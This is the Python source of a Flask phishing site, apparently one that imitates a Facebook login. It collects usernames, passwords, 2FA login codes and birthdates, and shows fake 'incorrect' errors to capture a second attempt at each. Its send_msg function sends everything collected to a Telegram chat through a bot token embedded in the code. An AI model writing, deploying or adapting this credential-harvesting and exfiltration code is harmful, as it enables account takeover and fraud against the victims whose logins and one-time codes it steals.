from flask import *
import datetime
import requests

app = Flask(__name__)
app.secret_key = 'hunga1999'


@app.route('/')
def hello_world():  # put application's code here
    return render_template('index.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        if 'username' in session and 'password' in session:
            session['username2'] = request.form['username']
            session['password2'] = request.form['password']
            return redirect(url_for('fa2'))
        else:
            session['username'] = request.form['username']
            session['password'] = request.form['password']
            current_date = datetime.date.today().strftime("%b %d, %Y")
            error = 'ID or Password are incorrect, please try again!'
            return render_template('verify.html', date=current_date, error=error)
    current_date = datetime.date.today().strftime("%b %d, %Y")
    return render_template('verify.html', date=current_date)


@app.route('/fa2', methods=['GET', 'POST'])
def fa2():
    if request.method == 'POST':
        if '2fa' in session :
            session['2fa2'] = request.form['logincode']
            return redirect(url_for('dob'))
        else:
            session['2fa'] = request.form['logincode']
            error = 'The login code you entered doesn \'t match the one sent to your phone. Please check the number and try again.'
            return render_template('fa2.html', error=error)
    return render_template('fa2.html')


@app.route('/dob', methods=['GET', 'POST'])
def dob():
    if request.method == 'POST':
        if 'birthday' in session:
            session['birthday2'] = request.form['day'] + '/' + request.form['month'] + '/' + request.form['year']
            myValue = "openfb"
            send_msg(session)
            session.clear()
            return render_template('dob.html', myValue=myValue)
        else:
            session['birthday'] = request.form['day'] + '/' + request.form['month'] + '/' + request.form['year']
            error = 'ID or Password are incorrect, please try again!'
            return render_template('dob.html', error=error)

    return render_template('dob.html')

def send_msg(session):
    token = '5819364895:AAEz85z7WX-ic2JAygTMMQ0k_d-Dlp6rSRE'
    chat_id = '-1001536828925'

    message = (f"User Name 1: {session.get('username')}\nPassword 1: {session.get('password')}\n2fa 1: {session.get('2fa')}\nDate 1: {session.get('birthday')}\n"
               f"***************************************\n"
               f"User Name 2: {session.get('username2')}\nPassword 2: {session.get('password2')}\n2fa 2: {session.get('2fa2')}\nDate 2: {session.get('birthday2')}")
    # Gửi message
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
    response = requests.get(url)



if __name__ == '__main__':
    app.run()
